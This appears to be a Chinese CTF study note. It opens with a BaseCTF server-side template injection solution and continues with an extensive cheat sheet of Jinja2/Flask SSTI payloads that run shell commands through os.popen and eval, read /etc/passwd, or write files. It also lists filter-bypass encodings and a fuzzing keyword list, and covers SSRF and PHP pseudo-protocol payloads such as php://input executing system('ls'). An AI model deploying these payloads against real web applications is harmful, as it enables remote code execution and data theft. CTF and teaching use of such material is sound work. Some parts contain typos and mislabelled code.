{{}}使用{%print%}绕过

__屏蔽选择  _''_绕过

.使用[]绕过
{{().__class__}} 可替换为:{{()["__class__"]}}

```

然后将经典句式替换(当然，具体位置和命令都可以修改)

```
{%print(c.__class__.__mro__[3].__subclasses__()[137].__init__.__globals__['popen']('whoami').read())%}进行替换
```

但是这里不知到为什么

```
__mro__失效了，于是运用基础的__base__
```

用一次base找到了obj，然后从obj用__subclasses__()进入经典变量popen所在地<class 'os._wrap_close'>

![](https://s2.loli.net/2024/11/17/HaWXK5RjcteZf7w.png)

之后按照经典套路进入popen执行命令即可

用init初始化，用global进入全局变量，选择popen，执行pwn命令并加上read读出指令让print打印出来

```
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('pwd')['rea''d']())%}
```

然后考虑到/被ban，使用chr绕过即可

```
BaseCTF{% set cmd='cat '~'%c'%(47)~'flag' %} {%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```

而为了修改方便，popen中的命令使用cmd变量即可

![](https://s2.loli.net/2024/11/17/vaTI4uZXSn6RDwh.png)


## SSIT

参考文献： [1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)](https://www.cnblogs.com/bmjoker/p/13508538.html)

​                    [2.SSTI模板注入总结-CSDN博客](https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=&request_id=&biz_id=102&utm_term=SSTI&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120739989.142^v100^pc_search_result_base4&spm=1018.2226.3001.4187)

​                    3.[SSTI漏洞详解-CSDN博客](https://blog.csdn.net/apple_74953689/article/details/140721321?ops_request_misc=%7B%22request%5Fid%22%3A%223145705D-6786-467D-98D5-EB37BF3A7091%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=3145705D-6786-467D-98D5-EB37BF3A7091&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-140721321-null-null.142^v100^pc_search_result_base4&utm_term=SSTI&spm=1018.2226.3001.4187)

​		    4.[超详细SSTI模板注入漏洞原理讲解_ssti注入-CSDN博客](https://blog.csdn.net/qq_61955196/article/details/132237648?ops_request_misc=%7B%22request%5Fid%22%3A%223145705D-6786-467D-98D5-EB37BF3A7091%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=3145705D-6786-467D-98D5-EB37BF3A7091&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-132237648-null-null.142^v100^pc_search_result_base4&utm_term=SSTI&spm=1018.2226.3001.4187)

SSTI漏洞利用基本流程

获取当前类 -> 获取其object基类 -> 获取所有子类 -> 获取可执行shell命令的子类 -> 获取可执行shell命令的方法 -> 执行shell命令

### 概念详解

#### 继承（寻找能够rce的子类）

先找到obj，再从obj找rce

##### 找object

```php
	class A:pass
	class B(A):pass
	class C(B):pass
	class D(c):pass
//可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过__class__魔术方法来找到它的当前类
	c = C()
	print(c.__class)  //这个函数执行将会输出当前类C
	print(c.__class__.__base__)//这个函数将会找到C的父类B，以此类推，再加一个__base__可以找B的父类
    //从代码上看再之后A类上面应该是没有类了，但是其实所有的类都时object类的子类，当我们创建一个类而没有显式地指定它继承的父类时，这个类就会默认继承object类，
    print(c.__class__.__base__.__base__.__base__)//此时为c->C->B->A(A无指定继承父类）->object
    //当然这样自然很麻烦，于是出现了一个一步到位的东西
    print(c.__class__.__mro__[3])
    //这样就会以数组形式输出所有的父类当加上[3]时代表输出第三级父类，即object  
```

##### 从obj找rce类

```php
__subclasses__#可以用这个来获取所有子类，同样用数组形式给出
#一般rce普遍寻找的都是<class 'os._wrap_close'>类，位置一般在139个左右，大致去找找，不会差距太远
print(c.__class__.__mro__[3].__subclasses__()[138])
//之后就是命令的初始化和进入命令执行变量，这里我们一般选择popen
__init__//初始化
__globals__//返回全局变量
__globals__['popen']//从全局变量中选出popen
__globals__['popen']('whoami').read()//在popen中执行whoami命令，但是执行命令≠有输出，因此还要加上.read()来读取输出
//最终变成
print(c.__class__.__mro__[3].__subclasses__()[138].__init__.__globals__['popen']('whoami').read())
```



同时，也可以将命令修改成变量，便于修改

```
{{set cmd=***}}{{print(c.__class__.__mro__[3].__subclasses__()[138].__init__.__globals__['popen']('cmd').read())}}
```



### 函数执行与绕过

#### 模糊测试：可以通过burp之类来测一测关键词屏蔽

此处如果不出现相关答案，只会是错误挥着ban了

```
class
bases
mro
subclasses
getitem
init
globals
builtins
import
url_for
lipsum
config
popen
request
''
""
[]
()
.
+
_
 
0
1
2
3
4
5
6
7
8
9
$
%

```



#### 无过滤情况

1、直接使用system、cat等命令进行远程代码执行

```
\#**简单查找具体python类的索引：**
import os
print(''.__class__.__bases__[0].__subclasses__().index(os._wrap_close))


\#读取config
如果flag写入config内，那么可以直接{{config}}查看或者{{self.dict._TemplateReference__context.config}}

\#读取文件类，<type ‘file’> file位置一般为40，直接调用
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()}}
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}} (python3)

\#直接使用popen命令，python2是非法的，只限于python3
！！！！！！！！
**os._wrap_close** 类里有popen和builtins,一般位置为132~139附近
<class ‘site._Printer’> 调用os的popen执行命令
<class ‘warnings.catch_warnings’>一般位置为59，可以用它来调用file、os、eval、commands等


{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}


\#调用os的popen执行命令
\#python2、python3通用
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls /flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{''.__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()}}
\#python3专属
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}


\#调用eval函数读取
\#python2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
{{"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')}}
{{"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')}}
\#python3
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}} 
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']}}
{{"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}


\#调用 importlib类
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}


\#调用linecache函数
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']['os'].popen('ls').read()}}
{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}


\#调用communicate()函数
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}


\#写文件
写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。
{{"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')}}  ----python2的str类型不直接从属于基类，所以payload中含有两个 .__bases__
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').write('123456')}}


\#通用 getshell
原理：找到含有 __builtins__ 的类，利用即可。
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}

```



#### 常用的类方法

```
__class__用来查看变量所属的类

__bases__用来查看类的基类，就是父类（或者__base__）

__mro__：显示类和基类

__subclasses__()：查看当前类的子类

__getitem__：对数组字典的内容提取

__init__  : 初始化类，返回的类型是function

__globals__:查看全局变量，有哪些可用的函数方法等，然后再搜索popen，eval等

__builtins__:提供对Python的所有"内置"标识符的直接访问,即先加载内嵌函数再调用

__import__   ： 动态加载类和函数，用于导入模块，经常用于导入os模块（例如__import__('os').popen('ls').read()）

url_for ：flask的方法，可以用于得到__builtins__

lipsum ：flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}

config：当前application的所有配置。

popen():执行一个 shell 以运行命令来开启一个进程

request.args.key：获取get传入的key的值

```

#### 过滤绕过

##### 绕过[]

```
1、使用__getitem__绕过
{{().__class__.__bases__[0]}}
可替换为
{{().__class__.__bases__.__getitem__(0)}}
```

##### 绕过{{}}

```
{%print("".__class__)%}
```

本来并无回显，但是加个print就ok了

##### 绕过点

###### 使用中括号绕过点

```
{{().__class__}} 
可替换为:
{{()["__class__"]}}

举例：
{{()['__class__']['__base__']['__subclasses__']()[433]['__init__']['__globals__']['popen']('whoami')['read']()}}

```

###### 使用attr()函数绕过点

```
attr()函数是Python内置函数之一，用于获取对象的属性值或设置属性值。它可以用于任何具有属性的对象，例如类实例、模块、函数等。

{{().__class__}} 
可替换为：
{{()|attr("__class__")}}
{{getattr('',"__class__")}}

举例：
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(65)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("whoami").read()')}}
```

##### 绕过特殊符号

##### （其他类似/之类的都可以这么弄，因为本质上是编码绕过）

###### request绕过

```
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&arg1=open&arg2=/etc/passwd    
\#分析：
request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
若args被过滤了，还可以使用values来接受GET或者POST参数。

其它例子：
{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
Cookie:arg1=open;arg2=/etc/passwd

{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
post:arg1=open&arg2=/etc/passwd
```

###### chr绕过

```
{% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}

注意：使用GET请求时，+号需要url编码，否则会被当作空格处理。
```

##### init绕过

```
可以用__enter__或__exit__替代__init__

{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
 
{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

```



##### 绕过关键字

###### 切片将逆置的关键字顺序输出

```
""["__cla""ss__"]
"".__getattribute__("__cla""ss__")
反转
""["__ssalc__"][::-1]
"".__getattribute__("__ssalc__"[::-1])

```

###### +号绕过

```
{{()['__cla'+'ss__'].__bases__[0].__subclasses__()[40].__init__.__globals__['__builtins__']['ev'+'al']("__im"+"port__('o'+'s').po""pen('whoami').read()")}}
```

###### join拼接

```
利用join（）函数绕过关键字过滤

{{[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()}}
```

###### 引号绕过

```
_''_同样等于__
{{[].__class__.__base__.__subclasses__()[40]("/fl""ag").read()}}
```

###### 使用str原生函数replace替换

```
将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。

{{().__getattribute__('__claAss__'.replace("A","")).__bases__[0].__subclasses__()[376].__init__.__globals__['popen']('whoami').read()}}
```

###### ascii转换

```
将每一个字符都转换为ascii值后再拼接在一起。

"{0:c}".format(97)='a'
"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}".format(95,95,99,108,97,115,115,95,95)='__class__'
```

###### 编码绕过

```
16进制编码绕过
"__class__"=="\x5f\x5fclass\x5f\x5f"=="\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"

例子：
{{''.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__['__builtins__']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').popen('whoami').read()}}
\
同理，也可使用八进制编码绕过




base64编码绕过
对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。

"__class__"==("X19jbGFzc19f").decode("base64")

例子：
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}  
等价于  
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}




unicode编码绕过
{%print((((lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f"))|attr("\u0067\u0065\u0074")("os"))|attr("\u0070\u006f\u0070\u0065\u006e")("\u0074\u0061\u0063\u0020\u002f\u0066\u002a"))|attr("\u0072\u0065\u0061\u0064")())%}
等同于lipsum.__globals__['os'].popen('tac /f*').read()




Hex编码绕过
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}   
等价于   
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

###### 

#### request方法绕过：

如果对我们特定的参数进行了严格的过滤，我们就可以使用request来进行绕过，request可以获得请求的相关信息，我们拿过滤__class__，可以用request.args.key且以GET方式提交key=**class__来替换被过滤的__class**

```
request.args.key  #获取get传入的key的值

request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)

reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get

request.cookies.key  #获取cookies传入参数

request.headers.key  #获取请求头请求参数

request.data  #获取post传入参数(Content-Type:a/b)

request.json  #获取post传入json参数 (Content-Type: application/json)

```

### SSRF

#### SSRF概念

是一种由攻击者构造请求，由服务端发起请求的安全漏洞。

一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务 端能请求到与自身相连而与外网隔离的内部系统)。

很多Web应用都提供了从其他服务器上获取数据的功能。

使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。

/etc/passwd
日志文件
配置文件

这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。
由于服务器提供了从其他服务器应用获取数据的功能，但是又没有对目标地址做严格的过滤和限制，导致攻击者可以传入任何的地址来让后端服务器对其发起请求

##### 例如：

```
A网站，是一个所有人都可以访问的外网网站，
B网站，是一个他们内部的OA网站。

所以，我们普通用户只可以访问A网站，不能访问B网站。但是我们可以同过A网站做跳板，访问B网站，从
而达到攻击b网站需求。
```

?image=192.168.1.*
这就是一个典型的没有过滤的

 #### SSRF原理解析

 URL构造如下

```
URI=scheme:[//authority]path[?query][#fragment]
```

其中authority文件分为以下三个部分

```
[userinfo@]hoost[:port]
```

##### 组成构造详解

| 语法内容  | 详情                                                         |
| :-------: | :----------------------------------------------------------- |
|  schema   | 由一串***大小写不敏感***的字符组成，表示获取资源所需要的协议 |
|           | userinfo：这个遇到得比较少，这是一个可选项，如果需要进行身份验证，格式为[username:password@]，以结尾 |
| authority | host：表示在哪个服务器上获取资源                             |
|           | port：服务器端口。***使用默认端口时可以省略***               |
|   path    | 指向资源的路径，一般用/来分割                                |
|   query   | 查询字符串，将输入数据传递给服务器端，如：向服务器传输用户名和密码 |
| fragment  | 其内容不会传到服务端，一般用于表示页面的锚点                 |

##### 原理解析

如果URL参数为一个图片的地址，那么将直接打印该图片

但是因为获取图片地址的URL参数未进行任何过滤，所以可以通过修改该地址或者协议来发起ssrf攻击

***例如***    将url的请求改为file://ect/password,使用file协议读取

#### SSRF的利用：

主要涉及函数：

```
file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。

readfile()：输出一个文件的内容。

fsockopen()：打开一个网络连接或者一个Unix 套接字连接。

curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。

fopen()：打开一个文件文件或者 URL。
```

1、http协议进行内网的ip扫描、端口探测

先去探测内网有哪些主机，开放了哪些端口
一个IP就代表一台服务器，主机
2、file协议进行本地文件的读取

知道一些敏感文件的位置

etc/passwd

my.ini, my.cnf （数据库配置文件
config

php配置文件

apache的配置文件

##### php函数利用SSRF

file_get_contents()函数

```
file_get_contents() 把整个文件读入一个字符串中。

该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。
```

### PHP伪协议

PHP支持的伪协议：

```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```

在CTF中，经常使用`file://`、`php://`、`data://`三种伪协议搭配不同环境来考查选手对这一知识的掌握，其中，每一种协议由它们各自的协议头和转换器构成，通过拼接的方式告诉服务器用户传入什么协议类型的的数据，数据该如何去解析。例如：

#### fill://协议

用于访问本地文件，读取本地文件，***且不受`allow_url_fopen`与`allow_url_include`设置的影响***，当不指定需要办函文件的绝对路径时，默认为该脚本存在的路径

```
<?php
$file = $_GET['file'];
if ($file){
	echo $file,"<br/>";
	include($file);
}
?>
```

当包含指定的flag.php文件，传入?file=flag.php，若内容为ook!，则返回

```
flag.php
oko!

```

当传入绝对路径绝对路径时，直接从路径中寻找，如file=D:\phpStudy\WWW\flag.php，则返回

```
D:\\phpStudy\\WWW\\flag.php
ook!
```

#### php://协议

php://下的协议很多，最常见的为php://filter和php://input

filter用于读取文件源码，一般将结果进行***base64加密***

input则用于***将输入当作PHP代码执行***



##### php://filter基本格式

```
协议头(php://filter)+/read(write)=过滤器（可选）+/resource=文件名（必须）
```

```
  常见过滤器：
  string.rot13	等同str_rot13()，rot13变换
  string.toupper	 等同str_toupper()，转大写
  string.tolower	等同str_tolower()，转小写
  string.strip_tags	等同strip_tags()，去处html、php标签
  convert.base64-encode&convert.base64-decode	  等同base64_encode()和base64_decode()，base64编码解码
  convert.quoted-printable-encode & convert.quoted-printable-decode	 quoted-printable 字符串与 8-bit 字符串编码解码
```

  ***举例***

```
直接读文件：php://filter/resourse=flag.php
加密文件内容：php://filter/read=convert.base64-encode/resource=flag.php
```

##### php://input协议

该协议可以访问请求的请求数据的只读流，将post请求的数据当作php代码执行。当传入的参数作作为文件名打开时，可以将参数设置为php://input，同时post想设置的文件内容，php代码执行时会***将post内容当作文件内容***

```
?file=php://input
POST: <?php system('ls');?>
```

#### data://协议

在CTF中，该协议基本用来执行PHP代码，一般需要用到base64传输，保证特殊字符的传递

此时要求：

```
allow_url_fopen:on
allow_url_include :on
php>V5.2
```

格式为

```php
协议头（data://）+text/plain(;base64),+ 明（密）文
```



##### 用法为：

```php
//传输明文：
?file=data://text/plain,<php phpinfo()?>
//传输base64编码:
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 
```

